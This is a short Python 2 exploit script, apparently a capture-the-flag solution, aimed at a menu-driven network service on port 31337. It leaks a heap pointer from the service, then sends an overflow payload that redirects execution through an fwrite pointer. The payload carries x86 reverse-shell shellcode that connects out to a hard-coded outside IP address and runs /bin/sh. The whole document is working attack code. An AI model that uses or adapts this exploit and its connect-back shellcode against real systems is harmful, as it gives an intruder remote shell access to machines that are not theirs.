import socket, time, struct

HOST = "localhost"
PORT = 31337
# Reverse Shell
SC = 	''.join(["\xeb\x08\x90\x90\xff\xff\xff\xff\x90\x90\x68",
		"\x47\x13\x90\x4a",   # <- IP Number 71.19.144.74
		"\x5e\x66\x68",
		"\x7a\x69" ,        # <- Port Number "31337"
		"\x5f\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02",
		"\x89\xe1\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79", 
		"\xf9\xb0\x66\x56\x66\x57\x66\x6a\x02\x89\xe1\x6a", 
		"\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b\x52\x68\x2f", 
		"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53", 
		"\xeb\xce"])

def recv_all(fd):
	ret = ""
	while True:
		time.sleep(0.5)
		try:
			v = fd.recv(100)
		except Exception as e:
			break
			'''
			time.sleep()
			try:
				v = fd.recv(100)
			except Exception as e:
				break
			'''
		ret += v
	return ret

ADDRESS_OF_FWRITE = 0x0804bd5c

def main():
	fd = socket.create_connection((HOST, PORT))
	fd.setblocking(0)
	print recv_all(fd)
	fd.sendall("I\n")
	print recv_all(fd)
	fd.sendall("B 3 3\n")
	print recv_all(fd)
	fd.sendall("XAAAAAAAA" + "\n")
	print recv_all(fd)
	fd.sendall("N\n")
	print recv_all(fd)
	fd.sendall("V\n")
	dat = recv_all(fd)
	leaked_heap = dat[21:26]
	leaked_heap_p = leaked_heap[0:2] + leaked_heap[3:5]
	leaked_heap = struct.unpack("<I", leaked_heap_p)[0]
	leaked_heap += 12
	leaked_heap_p = struct.pack("<I", leaked_heap)
	print "Leaked heap pointer is: %x" % leaked_heap
	fd.sendall("Q\n")
	print recv_all(fd)
	fd.sendall("I\n")
	print recv_all(fd)
	fd.sendall("B 20 20\n")
	print recv_all(fd)
	fd.sendall(SC + "\xff"*((20*20)-39-len(SC)) + "X"*(15) + struct.pack("<I", ADDRESS_OF_FWRITE) + leaked_heap_p + "B"*16 + "\n")
	print recv_all(fd)
	print recv_all(fd)

main()
